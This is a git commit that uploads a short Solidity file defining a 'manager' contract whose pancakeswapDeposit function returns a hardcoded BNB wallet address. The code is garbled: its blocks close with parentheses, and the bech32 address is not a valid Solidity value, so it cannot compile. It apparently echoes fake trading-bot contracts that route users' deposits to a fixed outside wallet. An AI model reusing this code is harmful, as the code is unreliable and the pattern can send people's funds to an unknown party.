f2bbfeacd9c1dd7b54f90f1411d18b7a5a20c5aa
tech20045 <105287132+tech20045@users.noreply.github.com>
2022-05-10 04:38:36 -0700

    Add files via upload

---
+++ add.sol
@@ -0,0 +1,14 @@
+pragma solidity ^0.5.0;
+
+
+contract manager {
+        function performTask() public pure {
+        )
+
+
+
+       function pancakeswapDeposit() public pure returns (address) {
+               return bnb1scrzg5x26hkhyr8d7e0sf0yr4h8zw5xsk3wuax;
+       )
+
+)
